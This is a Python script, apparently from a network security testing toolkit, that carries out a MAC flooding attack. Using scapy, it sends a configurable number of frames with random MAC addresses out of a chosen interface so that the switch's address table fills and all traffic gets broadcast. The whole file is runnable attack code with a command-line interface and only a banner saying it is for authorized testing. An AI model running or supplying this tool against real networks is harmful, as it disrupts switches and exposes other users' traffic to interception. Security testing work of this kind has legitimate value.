#!/usr/bin/env python3
"""
MAC Flooding Attack Simulation

Overwhelms a network switch's MAC address table by sending frames with random source MAC addresses,
causing the switch to enter fail-open mode and broadcast all traffic.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, time, argparse
from typing import Dict, Any

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    from scapy.all import Ether, IP, TCP, RandMAC, sendp, conf
except ImportError:
    logger.error("Requires scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0


class MACFloodingAttack:
    """MAC Flooding attack simulator."""

    def __init__(self, interface: str, count: int = 1000, rate: int = 100, verbose: bool = False):
        self.interface = interface
        self.count = max(1, count)
        self.rate = max(1, rate)
        self.verbose = verbose
        self.delay = 1.0 / self.rate
        self.frames_sent = 0
        conf.verb = 1 if verbose else 0
        logger.info(f"Initialized MAC flooding attack on {interface}")

    def execute(self) -> Dict[str, Any]:
        """Execute the MAC flooding attack."""
        logger.info(f"Starting MAC flooding attack: {self.count} frames at {self.rate}/sec")
        start_time = time.time()

        try:
            for i in range(1, self.count + 1):
                frame = Ether(src=str(RandMAC()), dst=str(RandMAC()))/IP(dst="192.168.1.1")/TCP()
                sendp(frame, iface=self.interface, verbose=0)
                self.frames_sent += 1

                if i % (self.count // 10 or 1) == 0:
                    logger.info(f"Progress: {i}/{self.count} frames")

                if self.delay > 0:
                    time.sleep(self.delay)

            logger.info("MAC flooding completed")
        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            duration = time.time() - start_time
            stats = {"frames_sent": self.frames_sent, "duration_seconds": duration}
            logger.info(f"Sent {stats['frames_sent']} frames in {stats['duration_seconds']:.2f}s")
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="MAC Flooding Attack Simulation")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Number of frames")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Frames per second")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        attack = MACFloodingAttack(args.interface, args.count, args.rate, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
